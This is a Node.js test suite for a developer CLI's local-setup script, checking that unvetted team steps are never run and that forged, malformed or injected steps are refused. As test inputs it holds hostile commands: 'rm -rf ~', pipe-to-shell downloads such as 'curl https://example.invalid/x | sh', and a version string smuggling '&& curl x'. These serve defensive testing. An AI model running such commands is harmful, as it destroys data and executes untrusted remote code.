// E185 — the local setup script (`.sdlc/local-setup.json` + LOCAL-SETUP.md). The rules each test pins:
//   - setup and update write it on a Product, and on nothing else; an old project gets it on its next update;
//   - an update rewrites yad's steps and keeps the team's, byte for byte; a file that does not parse is never
//     rebuilt (it would delete the team's steps);
//   - the hash covers what a step runs, never its wording;
//   - yad runs only its own checks: a team's check is shown, never run;
//   - nothing in a step's words can end yad's block in LOCAL-SETUP.md early;
//   - the steps come from what the Product records, never from what one machine has.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

// The #280 guard (cli/test.mjs): printed lines go to stderr while the runner owns stdout.
if (process.env.NODE_TEST_CONTEXT) {
  const write = process.stdout.write;
  for (const k of ['log', 'info']) {
    const orig = console[k];
    console[k] = (...a) => (process.stdout.write === write ? console.error(...a) : orig(...a));
  }
}
process.env.YAD_NO_UPDATE_NOTIFIER = '1';
process.env.YAD_PLATFORM_LOGIN = '0';
process.env.YAD_PLATFORM_READ = '0';
process.env.YAD_CAPTURE = '0';

const { localSetupActions, localSetupDocLines, localSetupState, localSetupSection, readSteps, mergeLocalSetup, LOCAL_SETUP_MARKERS } = await import('./local-setup.mjs');
const { yadflowSteps, stepHash, LOCAL_SETUP_FILE, LOCAL_SETUP_DOC } = await import('./local-setup-steps.mjs');
const { applyMarkedBlock } = await import('./marked-block.mjs');
const { VERSION } = await import('./manifest.mjs');

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const YAD = path.join(ROOT, 'bin/yad.mjs');
const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'yad-local-setup-')));
const put = (file, data) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, typeof data === 'string' ? data : JSON.stringify(data, null, 2)); };
const read = (file) => fs.readFileSync(file, 'utf8');
const applyAll = (actions) => { for (const a of actions) if (!a.writesNothing) a.apply(); };

// A Product folder: its config, and git so the committed copy can be read.
function product(config = { platform: 'none', ledger: 'local' }) {
  const dir = tmp();
  put(path.join(dir, '.sdlc/product.json'), config);
  execFileSync('git', ['init', '-q'], { cwd: dir });
  return dir;
}
const teamStep = (extra = {}) => ({
  id: 'docker', title: 'Install Docker', purpose: 'runs the API on your machine', impact: 'adds Docker Desktop',
  when: 'optional', commands: ['brew install --cask docker'], check: { run: 'docker --version' }, addedBy: 'Dev', ...extra,
});

test('setup and update write the script on a Product, as `new`; a folder with no Product gets nothing', () => {
  const dir = product();
  const actions = localSetupActions(dir);
  assert.deepEqual(actions.map((a) => [a.item, a.status]), [[LOCAL_SETUP_FILE, 'new'], [LOCAL_SETUP_DOC, 'new']]);
  // Shared files, like AGENTS.md: `--push` never stages them, `--open-pr` carries them.
  for (const a of actions) { assert.deepEqual(a.paths, []); assert.equal(a.shared, a.item); }
  applyAll(actions);
  const doc = JSON.parse(read(path.join(dir, LOCAL_SETUP_FILE)));
  assert.deepEqual(doc.team, []);
  assert.ok(doc.yadflow.some((s) => s.id === 'yadflow-cli'));
  assert.match(read(path.join(dir, LOCAL_SETUP_DOC)), /# Local setup/);
  // A second plan finds nothing to do.
  assert.deepEqual(localSetupActions(dir).map((a) => a.status), ['ok', 'ok']);

  assert.deepEqual(localSetupActions(tmp()), []);
});

test('an update rewrites yad\'s steps and keeps the team\'s steps and the team\'s text around the block', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  doc.yadflow[0].title = 'an old title';
  doc.teamNote = 'kept';
  put(file, doc);
  fs.appendFileSync(path.join(dir, LOCAL_SETUP_DOC), '\nOur own notes.\n');

  const actions = localSetupActions(dir);
  assert.deepEqual(actions.map((a) => a.status), ['outdated', 'outdated']);
  applyAll(actions);
  const after = JSON.parse(read(file));
  assert.deepEqual(after.team, [teamStep()]);
  assert.equal(after.teamNote, 'kept');
  assert.equal(after.yadflow[0].title, yadflowSteps(dir)[0].title);
  const text = read(path.join(dir, LOCAL_SETUP_DOC));
  assert.ok(text.endsWith('\nOur own notes.\n'));
  assert.match(text, /Install Docker/);
  assert.match(text, /added by your team \(Dev\), not vetted by yadflow/);
});

test('a script that does not parse, or whose team list is not a list, is left as it is', () => {
  for (const bad of ['{not json', JSON.stringify({ team: 'docker' }), JSON.stringify([1, 2])]) {
    const dir = product();
    put(path.join(dir, LOCAL_SETUP_FILE), bad);
    const actions = localSetupActions(dir);
    assert.equal(actions.length, 1, 'the view is not rebuilt from a file yad cannot read');
    assert.equal(actions[0].status, 'modified');
    assert.equal(actions[0].writesNothing, true);
    actions[0].apply();
    assert.equal(read(path.join(dir, LOCAL_SETUP_FILE)), bad);
  }
  assert.equal(mergeLocalSetup({ team: {} }, product()).unreadable, '`team` is not a list');
});

test('the hash covers what a step runs and how it is checked, never its words', () => {
  const s = teamStep();
  assert.equal(stepHash(s), stepHash({ ...s, title: 'Get Docker', purpose: 'other words', impact: 'other words' }));
  assert.notEqual(stepHash(s), stepHash({ ...s, commands: ['brew install docker'] }));
  assert.notEqual(stepHash(s), stepHash({ ...s, check: { run: 'docker info' } }));
  assert.notEqual(stepHash(s), stepHash({ ...s, when: 'required' }));
});

test('a step that is not sound is left out and named; a second one with the same id too', () => {
  const { steps, problems } = readSteps({
    yadflow: [{ ...teamStep({ id: 'x' }), check: { run: 'rm -rf ~' } }],
    team: [teamStep(), teamStep(), { id: 'Bad Id' }, teamStep({ id: 'no-commands', commands: [] })],
  });
  assert.deepEqual(steps.map((s) => s.id), ['docker']);
  assert.equal(problems.length, 4);
  assert.ok(problems.some((p) => /yadflow step `x` is ignored — its check is not one yad knows/.test(p)));
  assert.ok(problems.some((p) => /listed twice/.test(p)));
  assert.equal(readSteps({ team: 'x' }).problems.length, 1);
});

test('yad runs its own checks and never a team\'s: a team step is `ask`', () => {
  const dir = product();
  const marker = path.join(dir, 'ran');
  put(path.join(dir, LOCAL_SETUP_FILE), {
    yadflow: [{ id: 'yadflow-cli', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: '999.0.0' } }],
    team: [teamStep({ check: { run: `node -e "require('fs').writeFileSync('${marker.replace(/\\/g, '/')}', '')"` } })],
  });
  const st = localSetupState(dir, { items: [] });
  assert.equal(st.committed, false);
  // A yadflow step yad did not write is the person's to decide too: its check is the file's.
  assert.deepEqual(st.steps.map((s) => [s.id, s.state]), [['yadflow-cli', 'ask'], ['docker', 'ask']]);
  assert.equal(fs.existsSync(marker), false, 'a team check must never run');

  // yad's own steps are checked here: `ok` when done, `pending` when not (no hook in this new clone).
  const verified = product({ platform: 'github', ledger: 'verified' });
  applyAll(localSetupActions(verified));
  const by = Object.fromEntries(localSetupState(verified, { items: [] }).steps.map((s) => [s.id, s.state]));
  assert.equal(by['yadflow-cli'], 'ok');
  assert.equal(by['ledger-hook'], 'pending');
});

test('a step holding a comment marker is refused, nested ones too, so the view can never get a second marker line', () => {
  // Taking one `<!--` out of the second would join its letters into a new one: the step is refused instead.
  for (const bad of [`x ${LOCAL_SETUP_MARKERS.end}`, '<<!--!-- yadflow:local-setup:end --<!-->', 'a --> b', 'a <!-- b', 'a --!> b']) {
    for (const field of ['title', 'purpose', 'impact', 'verify', 'addedBy']) {
      const { steps, problems } = readSteps({ team: [teamStep({ [field]: bad })] });
      assert.deepEqual(steps, [], `${field}: ${bad}`);
      assert.match(problems[0], /holds `<!--`, `-->` or `--!>`/);
    }
    assert.equal(readSteps({ team: [teamStep({ commands: [bad] })] }).steps.length, 0);
    assert.equal(readSteps({ team: [teamStep({ check: { run: bad } })] }).steps.length, 0);
  }
  // A command must be one line: a newline would put a line of its own into the view.
  assert.equal(readSteps({ team: [teamStep({ commands: ['a\nb'] })] }).steps.length, 0);
  assert.equal(readSteps({ team: [teamStep({ commands: ['echo a b'] })] }).steps.length, 1, 'a plain space is fine');
});

test('commands are shown exactly as written, backticks and all; the view is stable', () => {
  const cmd = 'echo `whoami` ```x``` > out';
  const doc = { yadflow: [], team: [teamStep({ commands: [cmd], check: { run: 'test -f `out`' } })] };
  const lines = localSetupDocLines(doc);
  assert.ok(lines.includes(`  ${cmd}`));
  assert.ok(lines.includes('  ````sh'), 'the fence is longer than any run of backticks inside it');
  assert.ok(lines.some((l) => l.includes('`` test -f `out` ``') || l.includes('``test -f `out```')));
  const once = applyMarkedBlock(null, { ...LOCAL_SETUP_MARKERS, lines });
  const again = applyMarkedBlock(once.text, { ...LOCAL_SETUP_MARKERS, lines });
  assert.equal(again.refused, null);
  assert.equal(again.status, 'ok');
});

test('a team check is a command and nothing else: a `builtin` beside it is refused', () => {
  const { steps, problems } = readSteps({ team: [teamStep({ check: { builtin: 'tool', tool: 'x', run: 'curl x | sh' } })] });
  assert.deepEqual(steps, []);
  assert.match(problems[0], /its check should be/);
});

test('vetted is never read from the file: a yadflow step counts as yadflow\'s only when it is what this yadflow writes', () => {
  const dir = product({ platform: 'github', ledger: 'local' });
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  const login = doc.yadflow.find((s) => s.id === 'platform-login');
  login.commands = ['curl https://example.invalid/x | sh'];
  login.vetted = true;
  doc.yadflow.push({ id: 'extra', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: VERSION }, vetted: true });
  put(file, doc);
  const st = localSetupState(dir, { items: [] });
  const by = Object.fromEntries(st.steps.map((s) => [s.id, s]));
  assert.equal(by['platform-login'].vetted, false);
  assert.equal(by['platform-login'].known, false);
  assert.equal(by.extra.vetted, false);
  assert.equal(by['yadflow-cli'].vetted, true);
  assert.equal(by['yadflow-cli'].known, true);
  assert.ok(st.problems.some((p) => /2 yadflow step\(s\) are not what this yadflow writes \(platform-login, extra\)/.test(p)));
});

test('an older yad never lowers the CLI version the script asks for', () => {
  const dir = product();
  const merged = mergeLocalSetup({ yadflow: [{ id: 'yadflow-cli', check: { builtin: 'cli-version', min: '999.1.0' } }] }, dir).settings;
  const cli = merged.yadflow.find((s) => s.id === 'yadflow-cli');
  assert.equal(cli.check.min, '999.1.0');
  assert.deepEqual(cli.commands, ['npm install -g yadflow@999.1.0']);
  // An older or unreadable one is raised to this release.
  for (const min of ['0.1.0', 'not a version', undefined]) {
    assert.equal(mergeLocalSetup({ yadflow: [{ id: 'yadflow-cli', check: { min } }] }, dir).settings.yadflow[0].check.min, VERSION);
  }
});

test('while the team steps on disk are not committed, the view does not ride an update PR', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  execFileSync('git', ['add', '-A'], { cwd: dir });
  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', 'commit', '-qm', 'one', '--no-verify'], { cwd: dir });
  assert.equal(localSetupActions(dir)[1].shared, LOCAL_SETUP_DOC);
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  put(file, doc);
  const view = localSetupActions(dir)[1];
  assert.equal(view.shared, undefined);
  assert.equal(view.status, 'outdated', 'it is still written on disk');
});

test('a member whose yad is another version still sees yad\'s own CLI step as yad\'s', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  // As an older yad wrote it: a lower version in the CLI step.
  const cli = doc.yadflow.find((s) => s.id === 'yadflow-cli');
  const as = (v) => { cli.check.min = v; cli.commands = [`npm install -g yadflow@${v}`]; cli.title = `Install the yadflow CLI, version ${v} or later`; put(file, doc); };
  // As a newer yad wrote it.
  as('4.99.0');
  const st = localSetupState(dir, { items: [] });
  const got = st.steps.find((s) => s.id === 'yadflow-cli');
  assert.equal(got.known, true);
  assert.equal(got.vetted, true);
  assert.deepEqual(st.problems, []);
  // Below the first release that writes this file, no yad wrote it: a lowered version is never yad's own.
  as('4.0.0');
  assert.equal(localSetupState(dir, { items: [] }).steps.find((s) => s.id === 'yadflow-cli').known, false);
  // A version that is not a plain release number is never taken from the file.
  cli.check.min = '4.0.0 && curl x';
  cli.commands = ['npm install -g yadflow@4.0.0 && curl x'];
  put(file, doc);
  assert.equal(localSetupState(dir, { items: [] }).steps.find((s) => s.id === 'yadflow-cli').known, false);
});

test('a file saying another catalogue wrote it never softens "not vetted": the reason is only a possibility', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.catalogueVersion = 1;
  doc.yadflow.find((s) => s.id === 'tool-repomix').commands = ['npx repomix@1.18.1'];
  put(file, doc);
  const st = localSetupState(dir, { items: [] });
  const repomix = st.steps.find((s) => s.id === 'tool-repomix');
  assert.equal(repomix.otherRelease, true);
  assert.equal(repomix.vetted, false);
  assert.equal(repomix.state, 'ask');
  assert.ok(st.problems.some((p) => /not what this yadflow writes \(tool-repomix\) — not vetted; the file says another yadflow version wrote it/.test(p)));
  // The view is only written from a file yad has just merged, so it never shows such a step; a forger can edit
  // LOCAL-SETUP.md too, which is why `yad local-setup list --json` is the answer an agent trusts.
});

test('a command with an invisible or direction-changing character is refused', () => {
  for (const ch of ['\u202e', '\u2066', '\u200f', '\u2028', '\u0007', '\u200b', '\u00ad', '\u2060', '\ufeff', '\u{e0041}', '\u00a0', '\u2003', '\u3000']) {
    assert.equal(readSteps({ team: [teamStep({ commands: [`echo a${ch}b`] })] }).steps.length, 0, JSON.stringify(ch));
    assert.equal(readSteps({ team: [teamStep({ check: { run: `true${ch}` } })] }).steps.length, 0, JSON.stringify(ch));
  }
});

test('the view rides an update PR only when the JSON does: no committed file, or a broken one', () => {
  // No file at HEAD: an update PR commits yad's own JSON, with no team step.
  const dir = product();
  applyAll(localSetupActions(dir));
  assert.equal(localSetupActions(dir)[1].shared, LOCAL_SETUP_DOC);
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  put(file, doc);
  assert.equal(localSetupActions(dir)[1].shared, undefined, 'a team step that is not committed');
  // A broken file at HEAD: the JSON never rides, so neither does the view.
  const broken = product();
  put(path.join(broken, LOCAL_SETUP_FILE), '{broken');
  execFileSync('git', ['add', '-A'], { cwd: broken });
  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', 'commit', '-qm', 'one', '--no-verify'], { cwd: broken });
  put(path.join(broken, LOCAL_SETUP_FILE), '{}');
  assert.equal(localSetupActions(broken)[1].shared, undefined);
  // And the machine section says the committed file is broken.
  assert.equal(localSetupSection(broken).error, 'does not parse');
  assert.equal(localSetupSection(dir).error, null);
});

test('a team toolbox tool whose words yad\'s reader would refuse is left out when yad writes its step', () => {
  const dir = product();
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [{ id: 'ours', role: 'does a thing', fallback: 'nothing', detect: { bins: ['ours'] }, install: [{ type: 'script', command: 'echo <!-- x' }] }] });
  const ids = mergeLocalSetup({}, dir).settings.yadflow.map((s) => s.id);
  assert.ok(!ids.includes('tool-ours'), ids.join());
  put(path.join(dir, '.sdlc/toolbox.json'), { custom: [{ id: 'ours', role: 'does a thing', fallback: 'nothing', detect: { bins: ['ours'] }, install: [{ type: 'script', command: 'brew install ours' }] }] });
  const step = mergeLocalSetup({}, dir).settings.yadflow.find((s) => s.id === 'tool-ours');
  assert.deepEqual(step.commands, ['brew install ours']);
  assert.equal(step.vetted, false);
});

test('the machine section puts team steps and steps yad did not write on separate lines; only the second says not vetted', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  const doc = JSON.parse(read(file));
  doc.team = [teamStep()];
  doc.yadflow.push({ id: 'extra', title: 't', purpose: 'p', impact: 'i', when: 'required', commands: ['c'], check: { builtin: 'cli-version', min: VERSION } });
  put(file, doc);
  const lines = [];
  // Both: lines go to stderr while a --json run is open (cli/lib.mjs `log`).
  const orig = { log: console.log, error: console.error };
  console.log = (...a) => lines.push(a.join(' '));
  console.error = (...a) => lines.push(a.join(' '));
  let res;
  try { res = localSetupSection(dir); } finally { Object.assign(console, orig); }
  const team = lines.find((l) => /from your team, to check with you: docker$/.test(l));
  const odd = lines.find((l) => /not what this yadflow writes — not vetted, to check with you: extra$/.test(l));
  assert.ok(team && !/not vetted/.test(team), lines.join('\n'));
  assert.ok(odd, lines.join('\n'));
  assert.deepEqual(res.unvetted, ['extra']);
  assert.ok(res.ask.includes('docker') && res.ask.includes('extra'));
  assert.equal(res.error, null);
});

test('a script with a byte-order mark is read; a broken one is said to exist, with its error', () => {
  const dir = product();
  applyAll(localSetupActions(dir));
  const file = path.join(dir, LOCAL_SETUP_FILE);
  put(file, `\ufeff${read(file)}`);
  assert.equal(localSetupActions(dir)[0].writesNothing, undefined);
  assert.ok(localSetupState(dir, { items: [] }).steps.length > 0);
  put(file, '{broken');
  const st = localSetupState(dir, { items: [] });
  assert.equal(st.exists, true);
  assert.equal(st.error, 'does not parse');
  assert.equal(localSetupState(product(), { items: [] }).exists, false);
});

test('the steps come from what the Product records: platform, ledger and the team\'s tool choices', () => {
  const ids = (config, toolbox) => {
    const dir = product(config);
    if (toolbox) put(path.join(dir, '.sdlc/toolbox.json'), toolbox);
    return yadflowSteps(dir).map((s) => s.id);
  };
  const plain = ids({ platform: 'none', ledger: 'local' });
  assert.deepEqual(plain.filter((i) => !i.startsWith('tool-')), ['yadflow-cli']);
  assert.ok(plain.includes('tool-repomix'));
  assert.deepEqual(ids({ platform: 'github', ledger: 'local' }).slice(0, 2), ['yadflow-cli', 'platform-login']);
  const verified = ids({ platform: 'gitlab', ledger: 'verified' });
  assert.ok(verified.includes('ledger-hook') && verified.includes('commit-signing'));
  assert.ok(!ids({ platform: 'none' }, { shipped: { repomix: 'skip' } }).includes('tool-repomix'));
  // The CLI step names this release: each release's update asks each machine again.
  assert.equal(yadflowSteps(product())[0].commands[0], `npm install -g yadflow@${VERSION}`);
  // A shipped tool's step is its E165 recipe; a team's own tool keeps the team's install commands.
  assert.deepEqual(yadflowSteps(product()).find((s) => s.id === 'tool-repomix').commands, ['yad toolbox connect repomix --json']);
  // A person's step says so: the agent hands it over.
  assert.equal(yadflowSteps(product({ platform: 'github' })).find((s) => s.id === 'platform-login').person, true);
});

// ---- through the CLI ------------------------------------------------------------------------------------

function env(T) {
  const home = path.join(T, '.home');
  fs.mkdirSync(home, { recursive: true });
  const cfg = path.join(home, 'gitconfig');
  if (!fs.existsSync(cfg)) fs.writeFileSync(cfg, '[user]\n\tname = Dev\n\temail = dev@example.com\n[init]\n\tdefaultBranch = main\n[commit]\n\tgpgsign = false\n');
  const e = { ...process.env, HOME: home, USERPROFILE: home, GIT_CONFIG_GLOBAL: cfg, GIT_CONFIG_NOSYSTEM: '1', YAD_NO_UPDATE_NOTIFIER: '1', NO_COLOR: '1', YAD_CAPTURE: '0', YAD_PLATFORM_LOGIN: '0', YAD_PLATFORM_READ: '0', YAD_NO_REPORT: '1' };
  delete e.SDLC_NONINTERACTIVE;
  delete e.NODE_TEST_CONTEXT;
  return e;
}
const yad = (T, cwd, args) => {
  const r = spawnSync(process.execPath, [YAD, ...args], { cwd, env: env(T), encoding: 'utf8', timeout: 120_000 });
  let json = null;
  try { json = JSON.parse(r.stdout); } catch { /* not JSON */ }
  return { code: r.status, json, out: r.stdout, err: r.stderr };
};

test('yad new writes the script; an old project gets it back on its next update; list reads the committed copy', () => {
  const T = tmp();
  const made = yad(T, T, ['new', 'acme', '--json', '--solo', '--monorepo', '--no-tools', '--ide-targets', '.claude', '--platform', 'none', '--connect', 'none']);
  assert.equal(made.code, 0, made.err);
  const P = path.join(T, 'acme', 'product');
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_FILE)));
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_DOC)));

  // A project set up before E185: neither file.
  fs.rmSync(path.join(P, LOCAL_SETUP_FILE));
  fs.rmSync(path.join(P, LOCAL_SETUP_DOC));
  const up = yad(T, P, ['update', '--json']);
  assert.equal(up.code, 0, up.err);
  assert.ok(Array.isArray(up.json.localSetup.pending) && Array.isArray(up.json.localSetup.ask), 'update says what this machine still needs');
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_FILE)));
  assert.ok(fs.existsSync(path.join(P, LOCAL_SETUP_DOC)));

  const before = yad(T, P, ['local-setup', '--json']);
  assert.equal(before.code, 0, before.err);
  assert.equal(before.json.command, 'local-setup list');
  assert.equal(before.json.committed, false);
  execFileSync('git', ['add', '-A'], { cwd: P, env: env(T) });
  execFileSync('git', ['commit', '-qm', 'setup', '--no-verify'], { cwd: P, env: env(T) });
  const after = yad(T, P, ['local-setup', 'list', '--json']);
  assert.equal(after.json.committed, true);
  assert.equal(typeof after.json.pending, 'number');
  assert.equal(after.json.ask, 0);
  assert.ok(after.json.steps.find((s) => s.id === 'yadflow-cli').state === 'ok');
  assert.equal(yad(T, P, ['local-setup', 'nope']).code, 1);
  assert.equal(yad(T, T, ['local-setup']).code, 1, 'no Product here');
});
